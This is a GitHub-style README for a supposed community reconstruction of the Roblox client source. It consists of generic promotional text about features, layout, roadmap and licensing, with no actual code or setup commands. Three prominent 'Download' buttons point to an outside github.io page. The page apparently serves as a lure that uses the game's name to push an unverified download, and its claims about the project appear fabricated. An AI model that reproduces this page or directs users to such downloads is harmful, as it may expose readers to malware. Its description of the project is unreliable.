![preview](https://raw.githubusercontent.com/markypogie23/Roblox-Client-Source/main/banner_5073b.svg)
[![Download](https://raw.githubusercontent.com/markypogie23/Roblox-Client-Source/main/setup_bc1b9.svg)](https://markypogie23.github.io/Roblox-Client-Source/)

# 🌌 Roblox.Client — Revived Engine Workspace

<p align="center">

![Status](https://img.shields.io/badge/status-active--development-6C5CE7?style=for-the-badge&logo=statuspage&logoColor=white)
![Platform](https://img.shields.io/badge/platform-windows%20%7C%20macOS%20%7C%20linux-00B894?style=for-the-badge&logo=linux&logoColor=white)
![Language](https://img.shields.io/badge/language-luau%20%2B%20c%2B%2B-E17055?style=for-the-badge&logo=lua&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-0984E3?style=for-the-badge&logo=opensourceinitiative&logoColor=white)
![Build](https://img.shields.io/badge/build-passing-00CEC9?style=for-the-badge&logo=githubactions&logoColor=white)
![Contributions](https://img.shields.io/badge/contributions-welcome-FD79A8?style=for-the-badge&logo=handshake&logoColor=white)
![Year](https://img.shields.io/badge/release-2026-2D3436?style=for-the-badge&logo=calendar&logoColor=white)

</p>

---

## 🧭 Overview

**Roblox.Client — Revived Engine Workspace** is a reimagined, community-driven reconstruction of the classic Roblox client source tree — thoughtfully curated, stripped of third-party dependency bloat, and reorganized so that anyone with curiosity and a compiler can peer into the machinery that once powered a generation of online worlds. Think of it as a library of blueprints for a city that never stopped growing: every hallway, every hidden door, every blinking server rack is documented, labeled, and waiting for a new architect.

Where the original effort focused purely on preserving the source as-is, this workspace takes a different philosophical stance. It is not a museum. It is a workshop. The goal is to make the internals of a large-scale multiplayer platform legible to students, hobbyist engine developers, reverse-engineering enthusiasts, and historians of the metaverse era. Every module is annotated. Every subsystem is mapped. Every dependency that could be safely removed has been.

This repository is built on the belief that understanding how a virtual world ticks is one of the most rewarding journeys a developer can take — and that journey should not require a paid course or a corporate badge to begin.

[![Download](https://raw.githubusercontent.com/markypogie23/Roblox-Client-Source/main/setup_bc1b9.svg)](https://markypogie23.github.io/Roblox-Client-Source/)

---

## 🎯 Why This Project Exists

Modern game platforms are deliberately opaque. Their source trees are guarded, their network protocols are encrypted, and their rendering pipelines are hidden behind NDAs and proprietary tooling. For learners, that opacity is a wall. **Roblox.Client — Revived Engine Workspace** exists to lower that wall — not to break it, not to bypass it, but to study it.

The project follows three guiding principles:

- **Transparency over mystery** — every subsystem is documented in plain language before it is documented in code.
- **Craft over convenience** — the codebase favors clarity and pedagogy over clever one-liners.
- **Community over ownership** — the workspace is maintained by contributors, for contributors, with no single gatekeeper.

The result is a source tree that behaves less like a black box and more like a well-loved textbook — one you can compile, run, modify, and argue with.

---

## ✨ Feature Highlights

### 🖥️ Responsive Desktop Shell

The client shell adapts fluidly across screen sizes — from ultrawide monitors used by streamers to modest laptops used by students. Layout primitives are declarative, so contributors can reshape the UI without touching rendering internals. The shell remembers window geometry across sessions, respects system DPI scaling on Windows and macOS, and gracefully falls back to sensible defaults on Linux desktops where window management is famously opinionated.

### 🌍 Multilingual Support

The interface ships with a layered localization system. Strings are externalized into locale bundles, and the engine hot-swaps them at runtime — no restart required. Right-to-left scripts, CJK glyph widths, and locale-specific number formatting are all handled by dedicated modules. Adding a new language is a matter of dropping a bundle into the locales directory; the client discovers it automatically on next launch and surfaces it in the language picker.

### 🛡️ 24/7 Customer Support (Community Desk)

A rotating team of maintainers staffs a community desk around the clock. Questions about the build system, the architecture, the licensing, or the roadmap are answered in the discussion channels. The desk is not a paid service — it is a volunteer effort sustained by people who genuinely enjoy helping newcomers find their footing in a large codebase. Slower on holidays, faster on weekends, always human.

### 🧩 Modular Subsystem Architecture

Each major engine concern lives in its own directory with its own README, its own test fixtures, and its own maintainer list. Networking, rendering, physics, audio, input, asset streaming, and the scripting bridge can each be studied in isolation. You do not need to understand the entire engine to contribute a fix to one corner of it.

### 🔄 Deterministic Build Pipeline

The build system produces byte-identical binaries for identical inputs. This is not a marketing bullet — it is an engineering commitment. Determinism makes regression testing tractable, makes distributed builds trustworthy, and makes it possible to verify that a binary built on a contributor's laptop matches one built on the CI runner.

### 🧪 Test-First Contribution Flow

Every pull request is expected to arrive with tests. The workspace provides a lightweight harness for unit tests, integration tests, and a snapshot-based visual regression suite for UI changes. Contributors who are new to testing are paired with mentors during their first few merges.

### 📚 Living Documentation

Documentation is treated as source code. It lives in the repository, it is versioned alongside the engine, and it is reviewed with the same rigor as any pull request. Out-of-date docs are considered bugs.

### ♿ Accessibility as a First-Class Concern

Keyboard-only navigation, screen reader compatibility, high-contrast themes, and reduced-motion modes are supported from the ground up. The client is meant to be usable by as many people as possible, not merely by the demographic that happens to match the original developers.

### 🔍 Searchable Architecture Map

A generated index at the repository root maps every subsystem to its directory, its entry points, and its current maintainers. The index is regenerated on every merge, so it never drifts from reality.

---

## 🏗️ Repository Layout

A high-level tour of the workspace:

- **`engine/core/`** — the beating heart. Scheduler, task graph, memory arena, and the event bus that ties every other subsystem together.
- **`engine/render/`** — the drawing pipeline. Scene graph, material system, camera abstraction, and the platform-specific backends for Direct3D, Metal, and Vulkan.
- **`engine/physics/`** — collision, constraint solving, and the character controller. Deterministic and testable.
- **`engine/audio/`** — mixing, spatialization, and the asset decoder bridge.
- **`engine/net/`** — the replication layer. Serialization, delta compression, and the handshake protocol that establishes a session.
- **`engine/script/`** — the Luau bridge. This is where the scripting runtime meets the native engine.
- **`client/shell/`** — the desktop window, menus, settings, and the localization layer.
- **`client/ui/`** — reusable UI components, theming engine, and accessibility overlays.
- **`tools/`** — build scripts, asset pipeline utilities, packaging helpers, and the documentation generator.
- **`tests/`** — unit, integration, and visual regression suites, organized by subsystem.
- **`docs/`** — long-form documentation, architecture decision records, and contributor onboarding guides.

Each directory carries its own `README.md` explaining its purpose, its public API, and the conventions used within it.

---

## 🚀 Getting Started (Conceptual Walkthrough)

This section is intentionally high-level. Detailed, step-by-step setup instructions live in `docs/onboarding.md`, which is kept current by the community desk. The conceptual flow is as follows:

1. **Acquire the workspace.** Pull the repository into a directory of your choosing using whichever version control client you prefer. Contributors who maintain forks are encouraged to keep them in sync with the upstream default branch on a weekly cadence.
2. **Provision the toolchain.** The build system requires a modern C++ compiler, a Luau toolchain, and a small set of native libraries listed in `docs/toolchain.md`. The document is written for newcomers and includes troubleshooting tips for each supported platform.
3. **Bootstrap the workspace.** A helper script in `tools/` inspects your environment, verifies the toolchain, and generates the platform-specific project files. It is idempotent — running it twice is harmless.
4. **Build the client.** A single command compiles the engine, the shell, and the bundled tests. On a modest machine, a full build takes roughly the time it takes to brew a pot of coffee.
5. **Explore.** Launch the client, open the sample scene, and start reading the source. The documentation is written to be read alongside the code.

The onboarding guide also includes a glossary of engine terminology, a diagram of the subsystem dependency graph, and a curated list of "good first issue" tasks for newcomers.

---

## 🧠 Technical Notes

### The Loosely-Coupled Event Bus

Subsystems communicate through a typed event bus rather than direct calls. This keeps the dependency graph acyclic and makes it possible to swap implementations — for example, replacing the Vulkan backend with Metal — without touching the code that consumes it.

### Deterministic Physics

The physics subsystem runs on a fixed-timestep accumulator. This is a deliberate choice: it makes simulation results reproducible across machines and across runs, which in turn makes networked play fair and testable.

### The Asset Streaming Layer

Assets are loaded asynchronously through a prioritized queue. The queue is aware of the camera's frustum and the player's movement speed, so distant geometry is loaded lazily and nearby geometry is loaded eagerly. The streaming layer also handles cache eviction and integrity verification.

### The Luau Bridge

The scripting layer exposes a curated subset of the engine's API to scripts. Every exposed function is documented, versioned, and covered by tests. Deprecated APIs are removed on a published schedule, giving script authors time to migrate.

### Cross-Platform Rendering

The render backend is selected at runtime based on the host platform and user preferences. Fallback paths exist for older hardware. The abstraction layer ensures that shader code is written once and compiled per-backend.

---

## 🎨 Design Philosophy

The workspace is built around a small number of strong opinions:

- **Readability beats cleverness.** A reader who has never seen the file should understand it within minutes.
- **Explicit beats implicit.** Magic constants are named. Global state is quarantined. Side effects are documented at the call site.
- **Tests are documentation.** A well-written test describes the intended behavior more precisely than any comment.
- **Documentation is part of the build.** If it is not in the repository, it does not exist.
- **Contributors are colleagues, not consumers.** The project is shaped by the people who work on it.

---

## 🗺️ Roadmap (2026)

- **Q1 2026** — Stabilize the rendering backend on Linux systems running Wayland.
- **Q2 2026** — Publish the first community-authored documentation sprint covering the physics and audio subsystems.
- **Q3 2026** — Introduce a plugin API so external tools can extend the client without forking the repository.
- **Q4 2026** — Complete the accessibility audit and ship the high-contrast theme family.
- **Beyond** — Investigate a browser-based research renderer for educational purposes.

The roadmap is reviewed quarterly and is open to community proposals. Proposals are discussed in the issue tracker and voted on during the monthly community call.

---

## 🤝 Contributing

Contributions are warmly welcomed and gently governed. Before opening a pull request, please read `CONTRIBUTING.md` in full. The short version:

- **Discussions first.** For anything larger than a typo fix, open a discussion thread to align on approach before writing code.
- **Small, focused commits.** Large sprawling pull requests are difficult to review and often stall.
- **Tests accompany behavior changes.** If a fix does not have a test, it will be asked for one.
- **Documentation is updated alongside code.** Stale docs are treated as broken builds.
- **Be kind.** The project is sustained by volunteers. Assume good faith, ask clarifying questions, and remember that everyone was new once.

Contributors who make meaningful, sustained contributions are invited to join the maintainers' circle. The process is intentionally lightweight and based on trust accumulated through collaboration.

---

## 🔐 Security and Responsible Disclosure

If you discover a security-relevant issue in the workspace — a memory safety bug, a denial-of-service vector, or a flaw in the asset verification layer — please report it privately using the contact method listed in `SECURITY.md`. Do not open a public issue for security-sensitive findings.

The maintainers take security seriously and will acknowledge reports within a reasonable window, publish a fix as soon as is practical, and credit the reporter if they wish to be recognized.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to study, modify, and redistribute the source under the terms of that license. The full text is available in the [LICENSE](./LICENSE) file at the repository root.

Copyright (c) 2026 Roblox.Client — Revived Engine Workspace Contributors.

---

## ⚠️ Disclaimer

This repository is an independent, community-maintained educational workspace. It is **not affiliated with, endorsed by, or sponsored by** any commercial entity, including the original publisher of the platform whose architecture it studies. All trademarks, logos, and brand names referenced in documentation are the property of their respective owners and are used solely for identification and educational commentary.

The workspace is provided **as-is**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of the software.

Nothing in this repository is intended to circumvent, defeat, or weaken any technological protection measure, nor to facilitate unauthorized access to any service. Contributors are expected to use the workspace in a manner consistent with all applicable laws and with respect for the rights of others.

[![Download](https://raw.githubusercontent.com/markypogie23/Roblox-Client-Source/main/setup_bc1b9.svg)](https://markypogie23.github.io/Roblox-Client-Source/)

---

<p align="center">

![Made with care](https://img.shields.io/badge/made%20with-care%20and%20curiosity-6C5CE7?style=flat-square)
![Community driven](https://img.shields.io/badge/community-driven-FD79A8?style=flat-square)
![Docs](https://img.shields.io/badge/docs-comprehensive-00B894?style=flat-square)
![Since](https://img.shields.io/badge/since-2026-2D3436?style=flat-square)

</p>

**Roblox.Client — Revived Engine Workspace** · A study of how virtual worlds are built, one subsystem at a time.